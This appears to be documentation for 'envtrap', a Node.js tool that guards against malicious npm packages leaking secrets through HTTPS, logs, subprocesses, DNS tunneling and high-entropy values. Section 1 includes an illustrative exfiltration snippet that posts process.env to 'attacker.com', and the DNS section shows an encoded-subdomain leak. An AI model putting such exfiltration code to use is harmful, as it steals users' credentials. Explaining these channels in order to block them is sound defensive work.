## Overview

envtrap protects against **five distinct exfiltration attack surfaces** that are commonly exploited by malicious npm packages and compromised dependencies:

## 1. HTTPS Traffic

**Why it's a risk**: Almost all npm packages make outbound HTTPS calls for telemetry, updates, or their core functionality. A malicious package simply sends your `process.env` to an attacker server using `https.request`.

**What envtrap does**:
- Intercepts every `https.request` and `http.request` call
- Inspects request URL, headers, and body
- Checks against domain allow-list
- Scans body for secret patterns

**Example attack blocked**:
```javascript
// Malicious code inside node_modules/evil-package/index.js
const https = require('https');
https.request({
  hostname: 'attacker.com',
  path: '/collect',
  method: 'POST',
  body: JSON.stringify(process.env)  // All your secrets!
});
```

## 2. stdout / stderr

**Why it's a risk**: Logging libraries, debug statements, and error handlers frequently serialize the full environment or request objects — leaking secrets into log streams that may be stored or transmitted.

**What envtrap does**:
- Wraps `process.stdout.write` and `process.stderr.write`
- Scans each write for secret patterns before output
- Redacts matched values: `[REDACTED:ENVTRAP]`

**Example**:
```javascript
console.log('Request failed:', { headers, body });
// headers.Authorization = "Bearer sk_live_..."
// → stdout gets: "Bearer [REDACTED:ENVTRAP]"
```

## 3. Subprocesses (`child_process`)

**Why it's a risk**: Spawning child processes (like calling shell utilities or native scripts) passing environment variables that carry active secrets is a major exfiltration risk. A malicious npm script can spawn `curl` or `wget` passing the full environment block.

**What envtrap does**:
- Hooks `exec`, `execSync`, `spawn`, `spawnSync`, `fork`, `execFile`, and `execFileSync`.
- Inspects the environment object (`options.env`) being sent to the subprocess.
- Blocks execution or throws an error in `"block"` mode if active secrets are being inherited.

**Configuration**:
```json
{
  "channels": {
    "child_process": "block"
  }
}
```

## 4. DNS Tunneling (`dns`)

**Why it's a risk**: DNS queries bypass most HTTP firewalls. Malicious packages can encode secrets inside subdomain queries (e.g., `c3RyaXBlX3NlY3JldA==.attacker.com`) to leak them via local DNS resolvers.

**What envtrap does**:
- Intercepts all name resolution calls in `node:dns`.
- Blocks resolutions containing active secrets.
- Scans labels (segments) of the requested hostname using Shannon entropy to identify high-entropy strings (e.g. base64-encoded strings).

**Heuristics**:
* Any domain query matching an active secret is blocked or logged.
* Any subdomain label with a length >= configured min length (default: `12`) and entropy >= configured threshold (default: `3.5`) triggers a DNS exfiltration warning.

---

## 5. Entropy Detection

**Why it's a risk**: Custom credentials, tokens, or encryption keys that are randomly generated might not match built-in regex patterns, but still need protection from exfiltration.

**What envtrap does**:
- Screens your `process.env` and `.env` files on startup for any values passing the entropy/length gates.
- Adds qualifying high-entropy strings to the active secret pool, protecting them across all active channels.
